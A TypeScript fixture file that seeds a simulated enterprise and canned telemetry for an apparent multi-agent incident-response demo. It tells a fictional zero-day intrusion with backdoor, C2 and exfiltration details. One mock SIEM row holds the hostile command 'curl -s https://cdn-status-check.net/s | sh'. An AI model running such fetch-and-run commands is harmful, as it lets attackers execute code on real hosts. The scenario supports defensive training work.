import type { EstateHost } from "../model.ts"

/* The estate.
   Everything the agents can observe is synthetic and lives here. No tool in
   Esper touches a real network, a real credential store, or a real host — the
   swarm reasons over a simulated enterprise so the demo is safe to run
   anywhere and reproducible when it matters. */

export const ESTATE: EstateHost[] = [
  { id: "edge-gw-01", name: "edge-gw-01", zone: "dmz", role: "Ingress gateway (Rivet Edge 4.2.1)", criticality: "critical", status: "healthy" },
  { id: "edge-gw-02", name: "edge-gw-02", zone: "dmz", role: "Ingress gateway (Rivet Edge 4.2.1)", criticality: "critical", status: "healthy" },
  { id: "app-web-11", name: "app-web-11", zone: "app", role: "Customer web front end", criticality: "high", status: "healthy" },
  { id: "app-web-12", name: "app-web-12", zone: "app", role: "Customer web front end", criticality: "high", status: "healthy" },
  { id: "app-api-21", name: "app-api-21", zone: "app", role: "Public API service", criticality: "high", status: "healthy" },
  { id: "app-api-22", name: "app-api-22", zone: "app", role: "Public API service", criticality: "high", status: "healthy" },
  { id: "build-ci-01", name: "build-ci-01", zone: "build", role: "CI runner pool controller", criticality: "high", status: "healthy" },
  { id: "build-art-01", name: "build-art-01", zone: "build", role: "Artifact registry", criticality: "critical", status: "healthy" },
  { id: "data-pg-01", name: "data-pg-01", zone: "data", role: "Primary customer database", criticality: "critical", status: "healthy" },
  { id: "data-obj-01", name: "data-obj-01", zone: "data", role: "Object store (customer exports)", criticality: "critical", status: "healthy" },
  { id: "corp-idp-01", name: "corp-idp-01", zone: "corp", role: "Identity provider", criticality: "critical", status: "healthy" },
  { id: "corp-fs-03", name: "corp-fs-03", zone: "corp", role: "Corporate file share", criticality: "normal", status: "healthy" },
  { id: "corp-ws-118", name: "corp-ws-118", zone: "corp", role: "Engineering workstation", criticality: "normal", status: "healthy" },
  { id: "corp-ws-204", name: "corp-ws-204", zone: "corp", role: "Finance workstation", criticality: "normal", status: "healthy" },
  { id: "ops-bastion-01", name: "ops-bastion-01", zone: "ops", role: "Jump host", criticality: "critical", status: "healthy" },
  { id: "ops-vault-01", name: "ops-vault-01", zone: "ops", role: "Secrets manager", criticality: "critical", status: "healthy" },
]

export const IDENTITIES = [
  { id: "svc-deploy", name: "svc-deploy", kind: "service account", privilege: "deploy to prod", owner: "platform" },
  { id: "svc-backup", name: "svc-backup", kind: "service account", privilege: "read all data stores", owner: "platform" },
  { id: "j.okonkwo", name: "j.okonkwo", kind: "human", privilege: "platform admin", owner: "platform" },
  { id: "r.almeida", name: "r.almeida", kind: "human", privilege: "finance", owner: "finance" },
  { id: "ci-runner", name: "ci-runner", kind: "workload", privilege: "publish artifacts", owner: "build" },
]

export const CVE_CATALOG: Record<
  string,
  { id: string; product: string; summary: string; cvss: number; status: string; published: string | null }
> = {
  "CVE-2026-31847": {
    id: "CVE-2026-31847",
    product: "Rivet Edge 4.x",
    summary:
      "Pre-authentication request-smuggling flaw in the Rivet Edge TLS terminator. A crafted chunked body reaches the admin router and permits arbitrary command execution as the gateway service account.",
    cvss: 9.8,
    status: "no vendor advisory — reserved identifier only",
    published: null,
  },
  "CVE-2025-40911": {
    id: "CVE-2025-40911",
    product: "OpenSSH 9.6",
    summary: "Resource exhaustion in connection handling. Patched estate-wide in January.",
    cvss: 5.3,
    status: "patched",
    published: "2025-11-04",
  },
}

export interface TelemetryRow {
  at: string
  host: string
  source: string
  detail: string
}

function minutesAgo(minutes: number): string {
  return new Date(Date.now() - minutes * 60_000).toISOString()
}

/* Pre-seeded ground truth for the zero-day scenario. The specialists discover
   this through their tools rather than being told it, which is what makes the
   commander's plan non-trivial: the answer is only assembled from several
   agents' partial views. */
export const GROUND_TRUTH = {
  firstTouch: minutesAgo(196),
  entryHost: "edge-gw-01",
  entryVector: "chunked POST to /admin/_health with a smuggled second request",
  implant: "libedgetls.so.2 (LD_PRELOAD backdoor, in-memory stager)",
  c2: ["185.121.44.19:443", "cdn-status-check[.]net"],
  stolenIdentities: ["svc-deploy"],
  lateral: ["edge-gw-01", "app-api-21", "build-ci-01", "build-art-01"],
  exfiltrated: { bytes: 1_842_000_000, target: "data-obj-01", destination: "185.121.44.19" },
  affectedBuild: "Rivet Edge 4.2.1",
  vulnerablePath: "src/http/chunked_reader.c:412 — length recomputed after header normalisation",
}

export function siemQuery(query: string): TelemetryRow[] {
  const q = query.toLowerCase()
  const rows: TelemetryRow[] = []
  if (q.includes("edge") || q.includes("gateway") || q.includes("gw") || q.includes("all")) {
    rows.push(
      { at: minutesAgo(196), host: "edge-gw-01", source: "waf", detail: "POST /admin/_health 200 — chunked body, Transfer-Encoding and Content-Length both present" },
      { at: minutesAgo(195), host: "edge-gw-01", source: "auth", detail: "gateway service account spawned /bin/sh — no interactive session" },
      { at: minutesAgo(193), host: "edge-gw-01", source: "file", detail: "write /usr/lib/libedgetls.so.2 by pid 4411 (rivet-edge)" },
    )
  }
  if (q.includes("api") || q.includes("lateral") || q.includes("all")) {
    rows.push(
      { at: minutesAgo(171), host: "app-api-21", source: "auth", detail: "svc-deploy authenticated from edge-gw-01 — first ever source for this principal" },
      { at: minutesAgo(168), host: "app-api-21", source: "process", detail: "unexpected child: curl -s https://cdn-status-check.net/s | sh" },
    )
  }
  if (q.includes("build") || q.includes("ci") || q.includes("artifact") || q.includes("all")) {
    rows.push(
      { at: minutesAgo(140), host: "build-ci-01", source: "auth", detail: "svc-deploy SSH from app-api-21" },
      { at: minutesAgo(132), host: "build-art-01", source: "audit", detail: "artifact publish outside pipeline: internal/agent-runtime@2.9.4-rc" },
    )
  }
  if (q.includes("exfil") || q.includes("object") || q.includes("data") || q.includes("all")) {
    rows.push({ at: minutesAgo(96), host: "data-obj-01", source: "audit", detail: "svc-backup listed and read 3,140 export objects in 11 minutes" })
  }
  if (rows.length === 0) {
    rows.push({ at: minutesAgo(4), host: "-", source: "siem", detail: `no rows matched: ${query}` })
  }
  return rows.sort((a, b) => a.at.localeCompare(b.at))
}

export function edrQuery(host: string): TelemetryRow[] {
  if (host === "edge-gw-01") {
    return [
      { at: minutesAgo(195), host, source: "edr", detail: "rivet-edge (pid 4411) → sh → curl; parent is the TLS terminator, not a shell" },
      { at: minutesAgo(193), host, source: "edr", detail: "LD_PRELOAD set in /etc/environment referencing libedgetls.so.2" },
      { at: minutesAgo(190), host, source: "edr", detail: "outbound TLS to 185.121.44.19:443 every 47s ± 3s jitter" },
    ]
  }
  if (host === "app-api-21") {
    return [
      { at: minutesAgo(168), host, source: "edr", detail: "in-memory stager, no file on disk; parent sshd session for svc-deploy" },
      { at: minutesAgo(150), host, source: "edr", detail: "read /var/run/secrets/deploy-token" },
    ]
  }
  if (host === "build-art-01") {
    return [
      { at: minutesAgo(132), host, source: "edr", detail: "registry write by svc-deploy from an address outside the runner CIDR" },
    ]
  }
  return [{ at: minutesAgo(3), host, source: "edr", detail: "no anomalous process activity in the retained window" }]
}

export function netflowQuery(host: string): TelemetryRow[] {
  const base: Record<string, TelemetryRow[]> = {
    "edge-gw-01": [
      { at: minutesAgo(190), host, source: "netflow", detail: "185.121.44.19:443 — 4,102 flows, 47s cadence, 1.1 KB up / 0.4 KB down. Beaconing." },
      { at: minutesAgo(171), host, source: "netflow", detail: "east-west to app-api-21:22 — new for this host" },
    ],
    "data-obj-01": [
      { at: minutesAgo(96), host, source: "netflow", detail: "1.84 GB egress to 185.121.44.19 over 11 minutes, single TLS session" },
    ],
    "app-api-21": [
      { at: minutesAgo(140), host, source: "netflow", detail: "east-west to build-ci-01:22" },
    ],
  }
  return base[host] ?? [{ at: minutesAgo(2), host, source: "netflow", detail: "nothing outside baseline" }]
}

export function dnsQuery(domain: string): TelemetryRow[] {
  if (domain.includes("cdn-status-check")) {
    return [
      { at: minutesAgo(190), host: "edge-gw-01", source: "dns", detail: "cdn-status-check.net → 185.121.44.19, registered 9 days ago, privacy-proxied registrar" },
      { at: minutesAgo(168), host: "app-api-21", source: "dns", detail: "cdn-status-check.net resolved from a second host" },
    ]
  }
  return [{ at: minutesAgo(1), host: "-", source: "dns", detail: `no resolutions recorded for ${domain}` }]
}

export function idpQuery(principal: string): TelemetryRow[] {
  if (principal.includes("deploy")) {
    return [
      { at: minutesAgo(171), host: "corp-idp-01", source: "idp", detail: "svc-deploy token minted from edge-gw-01 — no prior authentication from the DMZ" },
      { at: minutesAgo(140), host: "corp-idp-01", source: "idp", detail: "svc-deploy token still valid, expires in 41 minutes, 3 live sessions" },
    ]
  }
  if (principal.includes("backup")) {
    return [
      { at: minutesAgo(98), host: "corp-idp-01", source: "idp", detail: "svc-backup assumed by svc-deploy via role chain — permitted by policy, never previously used" },
    ]
  }
  return [{ at: minutesAgo(1), host: "corp-idp-01", source: "idp", detail: `${principal}: nothing anomalous in the window` }]
}

export function sbomScan(product: string): { host: string; version: string; affected: boolean }[] {
  if (!product.toLowerCase().includes("rivet")) return []
  return [
    { host: "edge-gw-01", version: "4.2.1", affected: true },
    { host: "edge-gw-02", version: "4.2.1", affected: true },
    { host: "app-web-11", version: "4.1.9", affected: false },
    { host: "app-web-12", version: "4.1.9", affected: false },
  ]
}

export function sandboxRepro(target: string): { reproduced: boolean; detail: string } {
  if (target.toLowerCase().includes("chunk") || target.toLowerCase().includes("rivet") || target.toLowerCase().includes("edge")) {
    return {
      reproduced: true,
      detail:
        `Reproduced against ${GROUND_TRUTH.affectedBuild} in an isolated container. ${GROUND_TRUTH.vulnerablePath}. ` +
        "The normaliser rewrites the header set but the chunked reader keeps the pre-normalisation length, so a second " +
        "request smuggled inside the body is dispatched to the admin router with the terminator's own privileges. " +
        "Pre-authentication, no user interaction, fully deterministic. 4.1.9 is not reachable — the admin router was " +
        "only mounted on the shared listener in 4.2.0.",
    }
  }
  return { reproduced: false, detail: `No reproduction path found for ${target} in the sandbox budget.` }
}

export function detonate(sample: string): { capability: string[]; config: Record<string, unknown> } {
  return {
    capability: [
      "LD_PRELOAD shared object; hooks SSL_read to inspect and inject",
      "in-memory stager, second stage never written to disk",
      "credential scraping from process memory and mounted secret paths",
      "socks proxy for east-west movement",
    ],
    config: {
      sample,
      c2: GROUND_TRUTH.c2,
      beaconSeconds: 47,
      jitterPercent: 6,
      campaignId: "RS-2026-04",
      killSwitch: "absence of /etc/.rv-lock",
    },
  }
}

export function intelLookup(indicator: string): { verdict: string; detail: string } {
  if (indicator.includes("185.121.44.19") || indicator.includes("cdn-status-check")) {
    return {
      verdict: "malicious — known actor infrastructure",
      detail:
        "Matches infrastructure clustering for a financially motivated intrusion set tracked as SALT MERIDIAN. " +
        "Observed pattern: edge-appliance zero-day for initial access, service-account theft for lateral movement, " +
        "artifact-registry poisoning for persistence, then bulk export of customer data. Typical time from access " +
        "to exfiltration is four to six hours, so treat dwell time as the binding constraint.",
    }
  }
  return { verdict: "unknown", detail: `No prior sighting of ${indicator} in the intelligence corpus.` }
}
